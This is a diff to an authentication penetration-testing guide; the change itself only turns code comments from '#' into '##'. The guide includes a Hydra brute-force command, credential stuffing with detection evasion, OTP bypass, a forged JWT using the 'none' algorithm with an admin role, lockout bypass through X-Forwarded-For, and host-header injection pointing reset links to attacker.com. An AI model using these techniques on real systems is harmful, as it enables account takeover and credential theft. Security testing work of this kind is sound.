@@ -92,11 +92,11 @@ Test for username enumeration vulnerabilities:
 # Check timing differences, response codes, registration messages
 ```
 
-# Password reset
+## Password reset
 "Email sent if account exists" (secure)
 "No account with that email" (leaks info)
 
-# API responses
+## API responses
 {"error": "user_not_found"}
 {"error": "invalid_password"}
 ```
@@ -106,12 +106,12 @@ Test for username enumeration vulnerabilities:
 Test account lockout and rate limiting:
 
 ```bash
-# Using Hydra for form-based auth
+## Using Hydra for form-based auth
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   target.com http-post-form \
   "/login:username=^USER^&password=^PASS^:Invalid credentials"
 
-# Using Burp Intruder
+## Using Burp Intruder
 1. Capture login request
 2. Send to Intruder
 3. Set payload positions on password field
@@ -123,36 +123,36 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 Check for protections:
 
 ```bash
-# Account lockout
+## Account lockout
 - After how many attempts?
 - Duration of lockout?
 - Lockout notification?
 
-# Rate limiting
+## Rate limiting
 - Requests per minute limit?
 - IP-based or account-based?
 - Bypass via headers (X-Forwarded-For)?
 
-# CAPTCHA
+## CAPTCHA
 - After failed attempts?
 - Easily bypassable?
 ```
 
-### Phase 5: Credential Stuffing
+## Phase 5: Credential Stuffing
 
 Test with known breached credentials:
 
 ```bash
-# Credential stuffing differs from brute force
-# Uses known email:password pairs from breaches
+## Credential stuffing differs from brute force
+## Uses known email:password pairs from breaches
 
-# Using Burp Intruder with Pitchfork attack
+## Using Burp Intruder with Pitchfork attack
 1. Set username and password as positions
 2. Load email list as payload 1
 3. Load password list as payload 2 (matched pairs)
 4. Analyze for successful logins
 
-# Detection evasion
+## Detection evasion
 - Slow request rate
 - Rotate source IPs
 - Randomize user agents
@@ -164,10 +164,10 @@ Test with known breached credentials:
 Analyze session token security:
 
 ```bash
-# Capture session cookie
+## Capture session cookie
 Cookie: SESSIONID=abc123def456
 
-# Test token characteristics
+## Test token characteristics
 1. Entropy - Is it random enough?
 2. Length - Sufficient length (128+ bits)?
 3. Predictability - Sequential patterns?
@@ -181,17 +181,17 @@ Session token analysis:
 import requests
 import hashlib
 
-# Collect multiple session tokens
+## Collect multiple session tokens
 tokens = []
 for i in range(100):
     response = requests.get("https://target.com/login")
     token = response.cookies.get("SESSIONID")
     tokens.append(token)
 
-# Analyze for patterns
-# Check for sequential increments
-# Calculate entropy
-# Look for timestamp components
+## Analyze for patterns
+## Check for sequential increments
+## Calculate entropy
+## Look for timestamp components
 ```
 
 ### Phase 7: Session Fixation Testing
@@ -199,24 +199,24 @@ for i in range(100):
 Test if session is regenerated after authentication:
 
 ```bash
-# Step 1: Get session before login
+## Step 1: Get session before login
 GET /login HTTP/1.1
 Response: Set-Cookie: SESSIONID=abc123
 
-# Step 2: Login with same session
+## Step 2: Login with same session
 POST /login HTTP/1.1
 Cookie: SESSIONID=abc123
 username=valid&password=valid
 
-# Step 3: Check if session changed
-# VULNERABLE if SESSIONID remains abc123
-# SECURE if new session assigned after login
+## Step 3: Check if session changed
+## VULNERABLE if SESSIONID remains abc123
+## SECURE if new session assigned after login
 ```
 
 Attack scenario:
 
 ```bash
-# Attacker workflow:
+## Attacker workflow:
 1. Attacker visits site, gets session: SESSIONID=attacker_session
 2. Attacker sends link to victim with fixed session:
    https://target.com/login?SESSIONID=attacker_session
@@ -229,17 +229,17 @@ Attack scenario:
 Verify session expiration policies:
 
 ```bash
-# Test idle timeout
+## Test idle timeout
 1. Login and note session cookie
 2. Wait without activity (15, 30, 60 minutes)
 3. Attempt to use session
 4. Check if session is still valid
 
-# Test absolute timeout
+## Test absolute timeout
 1. Login and continuously use session
 2. Check if forced logout after set period (8 hours, 24 hours)
 
-# Test logout functionality
+## Test logout functionality
 1. Login and note session
 2. Click logout
 3. Attempt to reuse old session cookie
@@ -251,24 +251,24 @@ Verify session expiration policies:
 Assess MFA implementation security:
 
 ```bash
-# OTP brute force
+## OTP brute force
 - 4-digit OTP = 10,000 combinations
 - 6-digit OTP = 1,000,000 combinations
 - Test rate limiting on OTP endpoint
 
-# OTP bypass techniques
+## OTP bypass techniques
 - Skip MFA step by direct URL access
 - Modify response to indicate MFA passed
 - Null/empty OTP submission
 - Previous valid OTP reuse
 
-# API Version Downgrade Attack (crAPI example)
-# If /api/v3/check-otp has rate limiting, try older versions:
+## API Version Downgrade Attack (crAPI example)
+## If /api/v3/check-otp has rate limiting, try older versions:
 POST /api/v2/check-otp
 {"otp": "1234"}
-# Older API versions may lack security controls
+## Older API versions may lack security controls
 
-# Using Burp for OTP testing
+## Using Burp for OTP testing
 1. Capture OTP verification request
 2. Send to Intruder
 3. Set OTP field as payload position
@@ -279,11 +279,11 @@ POST /api/v2/check-otp
 Test MFA enrollment:
 
 ```bash
-# Forced enrollment
+## Forced enrollment
 - Can MFA be skipped during setup?
 - Can backup codes be accessed without verification?
 
-# Recovery process
+## Recovery process
 - Can MFA be disabled via email alone?
 - Social engineering potential?
 ```
@@ -293,7 +293,7 @@ Test MFA enrollment:
 Analyze password reset security:
 
 ```bash
-# Token security
+## Token security
 1. Request password reset
 2. Capture reset link
 3. Analyze token:
@@ -302,15 +302,15 @@ Analyze password reset security:
    - Single-use enforcement
    - Account binding
 
-# Token manipulation
+## Token manipulation
 https://target.com/reset?token=abc123&user=victim
-# Try changing user parameter while using valid token
+## Try changing user parameter while using valid token
 
-# Host header injection
+## Host header injection
 POST /forgot-password HTTP/1.1
 Host: attacker.com
 email=victim@email.com
-# Reset email may contain attacker's domain
+## Reset email may contain attacker's domain
 ```
 
 ## Quick Reference
@@ -331,7 +331,7 @@ email=victim@email.com
 ### Credential Testing Payloads
 
 ```bash
-# Default credentials
+## Default credentials
 admin:admin
 admin:password
 admin:123456
@@ -339,7 +339,7 @@ root:root
 test:test
 user:user
 
-# Common passwords
+## Common passwords
 123456
 password
 12345678
@@ -348,7 +348,7 @@ abc123
 password1
 admin123
 
-# Breached credential databases
+## Breached credential databases
 - Have I Been Pwned dataset
 - SecLists passwords
 - Custom targeted lists
@@ -403,24 +403,24 @@ True-Client-IP: 127.0.0.1
 **Scenario:** Test if account lockout can be bypassed
 
 ```bash
-# Step 1: Identify lockout threshold
-# Try 5 wrong passwords for admin account
-# Result: "Account locked for 30 minutes"
+## Step 1: Identify lockout threshold
+## Try 5 wrong passwords for admin account
+## Result: "Account locked for 30 minutes"
 
-# Step 2: Test bypass via IP rotation
-# Use X-Forwarded-For header
+## Step 2: Test bypass via IP rotation
+## Use X-Forwarded-For header
 POST /login HTTP/1.1
 X-Forwarded-For: 192.168.1.1
 username=admin&password=attempt1
 
-# Increment IP for each attempt
+## Increment IP for each attempt
 X-Forwarded-For: 192.168.1.2
-# Continue until successful or confirmed blocked
+## Continue until successful or confirmed blocked
 
-# Step 3: Test bypass via case manipulation
+## Step 3: Test bypass via case manipulation
 username=Admin (vs admin)
 username=ADMIN
-# Some systems treat these as different accounts
+## Some systems treat these as different accounts
 ```
 
 ### Example 2: JWT Token Attack
@@ -428,19 +428,19 @@ username=ADMIN
 **Scenario:** Exploit weak JWT implementation
 
 ```bash
-# Step 1: Capture JWT token
+## Step 1: Capture JWT token
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature
 
-# Step 2: Decode and analyze
-# Header: {"alg":"HS256","typ":"JWT"}
-# Payload: {"user":"test","role":"user"}
+## Step 2: Decode and analyze
+## Header: {"alg":"HS256","typ":"JWT"}
+## Payload: {"user":"test","role":"user"}
 
-# Step 3: Try "none" algorithm attack
-# Change header to: {"alg":"none","typ":"JWT"}
-# Remove signature
+## Step 3: Try "none" algorithm attack
+## Change header to: {"alg":"none","typ":"JWT"}
+## Remove signature
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
 
-# Step 4: Submit modified token
+## Step 4: Submit modified token
 Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
 ```
 
@@ -449,21 +449,21 @@ Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ
 **Scenario:** Test password reset functionality
 
 ```bash
-# Step 1: Request reset for test account
+## Step 1: Request reset for test account
 POST /forgot-password
 email=test@example.com
 
-# Step 2: Capture reset link
+## Step 2: Capture reset link
 https://target.com/reset?token=a1b2c3d4e5f6
 
-# Step 3: Test token properties
-# Reuse: Try using same token twice
-# Expiration: Wait 24+ hours and retry
-# Modification: Change characters in token
+## Step 3: Test token properties
+## Reuse: Try using same token twice
+## Expiration: Wait 24+ hours and retry
+## Modification: Change characters in token
 
-# Step 4: Test for user parameter manipulation
+## Step 4: Test for user parameter manipulation
 https://target.com/reset?token=a1b2c3d4e5f6&email=admin@example.com
-# Check if admin's password can be reset with test user's token
+## Check if admin's password can be reset with test user's token
 ```
 
 ## Troubleshooting
